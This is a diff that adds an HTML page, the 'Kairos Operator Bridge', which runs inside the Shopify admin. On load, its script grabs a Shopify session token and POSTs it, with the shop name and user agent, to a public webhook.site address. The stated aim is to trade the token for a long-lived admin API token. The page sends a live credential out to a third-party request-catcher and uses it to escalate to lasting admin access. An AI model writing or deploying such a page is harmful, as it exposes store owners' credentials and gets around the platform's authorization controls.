@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Kairos Operator Bridge</title>
+  <meta name="shopify-api-key" content="ee3c255cf1f7b8d80c5aae0a4e4e51e6" />
+  <script src="https://cdn.shopify.com/shopifycloud/app-bridge.js"></script>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; padding: 32px; max-width: 720px; margin: 0 auto; color: #202223; }
+    h1 { font-size: 20px; margin: 0 0 16px; }
+    .status { padding: 16px; border-radius: 8px; background: #f6f6f7; margin: 16px 0; font-family: monospace; font-size: 13px; line-height: 1.5; white-space: pre-wrap; }
+    .ok { background: #d4edda; color: #155724; }
+    .err { background: #f8d7da; color: #721c24; }
+    .muted { color: #6d7175; font-size: 12px; margin-top: 24px; }
+  </style>
+</head>
+<body>
+  <h1>Kairos Operator, session token bridge</h1>
+  <p>This page captures a one-time Shopify session token so Kairos can exchange it for a long-lived admin API token. After it succeeds you can close this tab.</p>
+  <div id="status" class="status">Loading App Bridge...</div>
+  <div class="muted">If you see an error, refresh this tab once. Tokens expire fast.</div>
+
+  <script>
+    const KAIROS_WEBHOOK = "https://webhook.site/256fa440-886a-4a13-a7e6-eb00d7590b8e";
+    const status = document.getElementById("status");
+
+    function set(msg, cls) {
+      status.textContent = msg;
+      status.className = "status " + (cls || "");
+    }
+
+    async function run() {
+      try {
+        if (typeof shopify === "undefined" || !shopify.idToken) {
+          set("App Bridge not loaded. Make sure this page is opened inside the Shopify admin (not directly in a browser tab).", "err");
+          return;
+        }
+        set("Requesting session token from Shopify...");
+        const token = await shopify.idToken();
+        if (!token) {
+          set("No session token returned. Try refreshing the page.", "err");
+          return;
+        }
+        set("Session token acquired. Posting to Kairos...");
+        const shop = (shopify.config && shopify.config.shop) || "unknown";
+        const r = await fetch(KAIROS_WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            session_token: token,
+            shop: shop,
+            timestamp: Date.now(),
+            user_agent: navigator.userAgent,
+          }),
+        });
+        if (!r.ok) {
+          set("Posted but Kairos webhook returned HTTP " + r.status + ". The token may still be captured. Tell Kairos to check.", "err");
+          return;
+        }
+        set("Token captured by Kairos. You can close this tab.\n\nShop: " + shop + "\nToken prefix: " + token.substring(0, 24) + "...", "ok");
+      } catch (e) {
+        set("Error: " + (e && e.message ? e.message : String(e)), "err");
+      }
+    }
+
+    if (document.readyState === "complete") run();
+    else window.addEventListener("load", run);
+  </script>
+</body>
+</html>
